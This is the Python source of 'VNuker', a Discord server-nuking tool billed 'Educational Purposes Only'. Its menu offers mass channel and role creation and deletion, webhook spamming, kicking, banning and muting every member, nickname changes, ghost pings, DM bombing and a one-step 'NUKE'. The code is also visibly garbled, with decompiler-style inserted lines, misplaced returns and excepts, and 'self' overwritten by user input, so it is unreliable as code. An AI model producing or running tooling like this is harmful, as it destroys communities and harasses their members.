import os
import discord
import asyncio
import getpass
import time
import datetime
import random
from discord.ext import commands
from pystyle import Write, Colors, Colorate
from concurrent.futures import ThreadPoolExecutor

class VNuker:
    def __init__(self):
        self.bot_token = ''
        self.server_id = None
        self.bot = commands.Bot(command_prefix='$', intents=discord.Intents.all())
        self.guild = None
        self.thread_pool = ThreadPoolExecutor(max_workers=10)
        self.created_webhooks = []
        os.system('title VNuker@Nuker' if os.name == 'nt' else 'Write')
        None('')

    async def run(self):
        self.clear()
        print('[DEBUG] Checking saved credentials...')
        self.load_credentials()
        self.clear()
        self.purple_text('[~] Logging into bot...')
        await self.start_bot()

    def load_credentials(self):
        bot_tokens = self.read_file_lines('Bot-Token.txt')
        guild_ids = self.read_file_lines('Guild-ID.txt')
        print(f'[DEBUG] Loaded {len(bot_tokens)} bot token | {len(guild_ids)} guild IDs')
        if bot_tokens and guild_ids and (len(bot_tokens) == len(guild_ids)):
            self.purple_text('\n[?] Saved credentials found. Use them? (y/n): ', end='')
            use_saved = input().strip().lower()
            if use_saved == 'y':
                print()
                for idx, (token, gid) in enumerate(zip(bot_tokens, guild_ids)):
                    print(Colorate.Vertical(Colors.blue_to_cyan, f'[{idx + 1}] Token: {token[:30]}*** | Guild ID: {gid}'))
                self.purple_text('\n[?] VNuker choice (number): ', end='')
                try:
                    choice = int(input().strip()) - 1
                    self.bot_token = bot_tokens[choice]
                    self.server_id = int(guild_ids[choice])
        return None
                    self.purple_text('\n[?] Enter Bot Token: ', end='')
                    self.bot_token = input().strip()
                    self.purple_text('[?] Enter Guild ID: ', end='')
                    pass
                    try:
                        pass  # postinserted
                    self.server_id = int(input().strip())
                    return
                except (IndexError, ValueError):
                    self.red_text('[ERROR] Invalid selection. Exiting.')
                    exit()
                except ValueError:
                    self.red_text('[ERROR] Invalid Guild ID. Try again: ', end='')

    def read_file_lines(self, filename):
        if not os.path.exists(filename):
            print(f'[DEBUG] File not found: {filename}')
            return []

    def purple_text(self, text, end='\n'):
        Write.Print(text + end, Colors.purple, interval=0)

    def green_text(self, text, end='\n'):
        Write.Print(text + end, Colors.green, interval=0)

    def red_text(self, text, end='\n'):
        Write.Print(text + end, Colors.red, interval=0)

    def clear(self):
        os.system('cls' if os.name == 'nt' else 'Write')
        None('clear')

    def read_file_lines(self, filename):
        if not os.path.exists(filename):
            print(f'[DEBUG] File not found: {filename}')
            return []

    async def start_bot(self):
        @self.bot.event
        async def on_ready():
            self.guild = self.bot.get_guild(self.server_id)
            if not self.guild:
                self.purple_text('[ERROR] Guild not found. Check the Server ID.\n')
                await self.bot.close()
            return None
        try:
            await self.bot.start(self.bot_token)
        except discord.LoginFailure:
            self.purple_text('[ERROR] Invalid bot token.\n')
            exit()

    def clear(self):
        os.system('cls' if os.name == 'nt' else 'Write')
        None('clear')

    def banner(self):
        banner_text = '\n                            ___      ___ ________   ___  ___  ___  __    _______   ________     \n                           |\\  \\    /  /|\\   ___  \\|\\  \\|\\  \\|\\  \\|\\  \\ |\\  ___ \\ |\\   __  \\    \n                           \\ \\  \\  /  / \\ \\  \\\\ \\  \\ \\  \\\\\\  \\ \\  \\/  /|\\ \\   __/|\\ \\  \\|\\  \\   \n                            \\ \\  \\/  / / \\ \\  \\\\ \\  \\ \\  \\\\\\  \\ \\   ___  \\ \\  \\_|/_\\ \\   _  _\\  \n                             \\ \\    / /   \\ \\  \\\\ \\  \\ \\  \\\\\\  \\ \\  \\\\ \\  \\ \\  \\_|\\ \\ \\  \\\\  \\| \n                              \\ \\__/ /     \\ \\__\\\\ \\__\\ \\_______\\ \\__\\\\ \\__\\ \\_______\\ \\__\\\\ _\\ \n                               \\|__|/       \\|__| \\|__|\\|_______|\\|__| \\|__|\\|_______|\\|__|\\|__|  \n        '
        print(Colorate.Vertical(Colors.blue_to_cyan, banner_text))

    def promo(self):
        promo_text = '\n                                                    Made by Virtuous\n                                                Educational Purposes Only!\n                                              https://discord.gg/nNxKszZCKV\n        '
        Write.Print(promo_text + '\n', Colors.white, interval=0)

    def purple_text(self, text, end='\n'):
        Write.Print(text + end, Colors.purple, interval=0)

    def green_text(self, text, end='\n'):
        Write.Print(text + end, Colors.green, interval=0)

    def red_text(self, text, end='\\m'):
        Write.Print(text + end, Colors.red, interval=0)

    def white_text(self, text, end='\n'):
        Write.Print(text + end, Colors.white, interval=0)

    async def menu(self):
        pass
        self.clear()
        self.banner()
        self.promo()
        self.print_menu()
        choice = input(Colorate.Horizontal(Colors.blue_to_cyan, f'\n\n{getpass.getuser()}@virtuous choice: $ ')).strip()
        print('\n\n\n')
        if choice == '1':
            await self.create_channels()
        input('\nEnter to return to menu...')

    def print_menu(self):
        menu_text = '\n                                               ┌──────────────────────────┐\n                                               │      VIRTUOUS NUKER      │       \n            ┌──────────────────────────────────────────────────────────────────────────────────────────────────────┐\n            │[01] create channels       [05] webhook create         [09] kick members      [13] ghostping members  │\n            │[02] delete channels       [06] webhook delete         [10] ban members       [14] dm bomber          │\n            │[03] create roles          [07] webhook spammer        [11] mute members      [15] server pfp changer │\n            │[04] delete roles          [08] chat lagger            [12] nickname changer  [16] server name changer│\n            └──────────────────────────────────────────────────────────────────────────────────────────────────────┘\n            └─────────────────────────────────────────│  [17] NUKE  │──────────────────────────────────────────────┘\n                                                      └─────────────┘\n        '
        print(Colorate.Vertical(Colors.blue_to_cyan, menu_text))

    async def create_channels(self):
        self = input(Colorate.Vertical(Colors.blue_to_cyan, 'Enter channel name: ')).strip()
        print('\n')
        try:
            amount = int(input(Colorate.Vertical(Colors.blue_to_cyan, 'Enter number of channels: ')).strip())
            self.purple_text(f'\n[~] Creating {amount} Channels')
            print('\n\n')
            try:
                await asyncio.gather(*(self.guild.create_text_channel(name) for _ in range(amount)))
                    self.green_text(f'[+] Successfully created {amount} channels.')
        except ValueError:
            self.red_text('[-] Invalid number.')
        except Exception as e:
            self.red_text(f'[-] Failed to create channels: {e}')

    async def delete_channels(self):
        channels = [c for c in self.guild.channels if isinstance(c, discord.TextChannel)]
        if not channels:
            self.red_text('[-] No text channels to delete.')
        return None

    async def create_roles(self):
        role_name = input(Colorate.Vertical(Colors.blue_to_cyan, 'Enter role name: ')).strip()
        print('\n')
        try:
            amount = int(input(Colorate.Vertical(Colors.blue_to_cyan, 'How many roles?: ')).strip())
            print('\n')
            hoist = input('Display separately? (y/n): ').strip().lower() == 'y'
            assign_to_all = input('Assign to all members? (y/n): ').strip().lower() == 'y'
            created_roles = []
            try:
                for _ in range(amount):
                    role = await self.guild.create_role(name=role_name, hoist=hoist)
                        created_roles.append(role)
                else:  # inserted
                    self.green_text(f'[+] Created {amount} role(s).')
                    if assign_to_all:
                        for member in self.guild.members:
                            try:
                                await member.add_roles(*created_roles)
                        else:  # inserted
                            self.green_text('[+] Assigned new roles to all members.')
                    return None
        except ValueError:
            self.red_text('[-] Invalid number.')
        except:
            pass  # postinserted
        continue
        except Exception as e:
            self.red_text(f'[-] Failed to create roles: {e}')

    async def delete_roles(self):
        roles = [r for r in self.guild.roles if r!= self.guild.default_role and (not r.managed)]
        if not roles:
            print(Colorate.Vertical(Colors.blue_to_cyan, '[-] No deletable roles found.'))
        return None

    async def create_webhooks(self):
        self.purple_text('[~] Creating webhooks in all text channels...')
        self.created_webhooks.clear()
        for channel in self.guild.text_channels:
            await self.create_webhook_for_channel(channel)
        self.green_text(f'[+] Webhook creation complete: {len(self.created_webhooks)} total.')

    async def create_webhook_for_channel(self, channel):
        try:
            perms = channel.permissions_for(self.guild.me)
            if not perms.manage_webhooks:
                self.red_text(f'[-] Missing \'Manage Webhooks\' permission in \'{channel.name}\'')
            return None
        except discord.HTTPException as e:
            self.red_text(f"[HTTP ERROR] {e.status} in \'{channel.name}\': {(e.text if hasattr(e, 'text') else str(e))}")
            return
        except discord.Forbidden:
            self.red_text(f'[403 Forbidden] Cannot create webhook in \'{channel.name}\'')

    async def delete_webhooks(self):
        self.purple_text('[~] Deleting all webhooks...')
        tasks = []
        for channel in self.guild.text_channels:
            tasks.append(self.delete_webhooks_for_channel(channel))
        await asyncio.gather(*tasks)

    async def delete_webhooks_for_channel(self, channel):
        try:
            webhooks = await channel.webhooks()
                await asyncio.gather(*(wh.delete() for wh in webhooks))
                    self.green_text(f'[+] Deleted webhooks in {channel.name}.')
        except Exception as e:
            self.red_text(f'[-] Failed to delete webhooks in {channel.name}: {e}')

    async def webhook_spammer(self):
        message = input('Enter message to spam >>> ').strip()
        try:
            iterations = int(input('Enter messages per webhook >>> ').strip())
            threads = int(input('Enter how many threads >>> ').strip())
            self.clear()
            self.purple_text('[~] Fetching webhooks...\n')
            webhooks = []
            for channel in self.guild.text_channels:
                try:
                    whs = await channel.webhooks()
                        for wh in whs:
                            webhooks.append((wh, channel.name))
            if not webhooks:
                self.red_text('[-] No webhooks found.')
            return None
        except ValueError:
            self.red_text('[-] Invalid number.')
        except:
            pass  # postinserted
        continue

    async def chat_lagger(self):
        choice = input('Begin spam? (y/n) >>> ').strip().lower()
        if choice == 'y':
            if len(self.created_webhooks) < 2:
                self.red_text('[-] No webhooks found. Use option 5 first.')
                input('Press enter to return to main menu')
            return None
        return None

    async def kick_members(self):
        self.purple_text('[~] Kicking all members...')
        kicked = 0
        for member in self.guild.members:
            if member == self.bot.user or member.bot:
                continue
            try:
                await member.kick(reason='VNuker Kick All')
                    kicked += 1
                    self.green_text(f'[+] Kicked: {member.name}')
        else:  # inserted
            self.green_text(f'[+] Kicked {kicked} members.')
        except Exception as e:
            self.red_text(f'[-] Failed to kick {member.name}: {e}')

    async def ban_members(self):
        self.purple_text('[~] Banning all members...')
        banned = 0
        for member in self.guild.members:
            if member == self.bot.user or member.bot:
                continue
            try:
                await member.ban(reason='VNuker Ban All', delete_message_days=0)
                    banned += 1
                    self.green_text(f'[+] Banned: {member.name}')
        else:  # inserted
            self.green_text(f'[+] Banned {banned} members.')
        except Exception as e:
            self.red_text(f'[-] Failed to ban {member.name}: {e}')

    async def mute_members(self):
        self.purple_text('[~] Muting all members')
        for channel in self.guild.voice_channels + self.guild.text_channels:
            try:
                overwrite = discord.PermissionOverwrite()
                overwrite.send_messages = False
                overwrite.speak = False
                overwrite.connect = False
                await channel.set_permissions(self.guild.default_role, overwrite=overwrite)
                    self.green_text(f'[+] Muted default role in {channel.name}')
        except Exception as e:
            self.red_text(f'[-] Failed to set permissions in {channel.name}: {e}')

    async def change_nicknames(self):
        new_nick = input(Colorate.Vertical(Colors.blue_to_cyan, 'Enter new nickname for all members: ')).strip()
        print('\n')
        changed = 0
        self.purple_text('[~] Changing nicknames...')
        for member in self.guild.members:
            if member == self.bot.user or member.bot:
                continue
            try:
                await member.edit(nick=new_nick, reason='VNuker Nickname Change')
                    changed += 1
                    self.green_text(f'[+] Changed nickname: {member.name}')
        else:  # inserted
            self.green_text(f'[+] Changed nicknames for {changed} members.')
        except Exception as e:
            self.red_text(f'[-] Failed to change nickname for {member.name}: {e}')

    async def ghost_ping_members(self):
        try:
            cycles = int(input('How many ghost ping cycles? > '))
            members = [m for m in self.guild.members if not m.bot and m!= self.bot.user]
            if not members:
                self.red_text('[-] No valid members to ping.')
            return None
        except ValueError:
            self.red_text('[-] Invalid number.')

    async def dm_bomber(self):
        message = input('\nEnter your message >>> ').strip()
        print('\n')
        for member in self.guild.members:
            if member == self.bot.user or member.bot:
                continue
            try:
                await member.send(message)
                    timestamp = datetime.datetime.now().strftime('%H:%M:%S')
                    Write.Print(f'[{timestamp}]    ', Colors.purple, interval=0)
                    Write.Print('SUCCESSFUL       ', Colors.green, interval=0)
                    Write.Print(f'{member.name} - {member.id}\n', Colors.purple, interval=0)
        except Exception:
            timestamp = datetime.datetime.now().strftime('%H:%M:%S')
            Write.Print(f'[{timestamp}]    ', Colors.purple, interval=0)
            Write.Print('UNSUCCESSFUL     ', Colors.red, interval=0)
            Write.Print(f'{member.name} - {member.id}\n', Colors.purple, interval=0)

    async def server_pfp_changer(self):
        pfp_url = input('Enter URL of the new server profile picture: ').strip()
        try:
            async with self.bot.session.get(pfp_url) as response:
                    image_data = await response.read()
        except Exception as e:
            self.red_text(f'[-] Failed to change profile picture: {e}')

    async def server_name_changer(self):
        new_name = input('[>] Enter new server name >>> ').strip()
        try:
            await self.guild.edit(name=new_name)
                self.green_text(f'[+] Successfully changed server name to {new_name}.')
        except Exception as e:
            self.red_text(f'[-] Failed to change server name: {e}')

    async def nuke(self):
        new_server_name = input('[>] Enter new server name >>> ').strip()
        channel_name = input('[>] Enter channel name >>> ').strip()
        num_channels = int(input('[>] How many channels >>> ').strip())
        self = input('[>] Enter message to spam >>> ').strip()
        message = int(input('[>] How many messages >>> ').strip())
        if not channel_name or num_channels <= 0:
            self.red_text('[-] Invalid channel name or count.')
        return None
if __name__ == '__main__':
    vnuker = VNuker()
    asyncio.run(vnuker.run())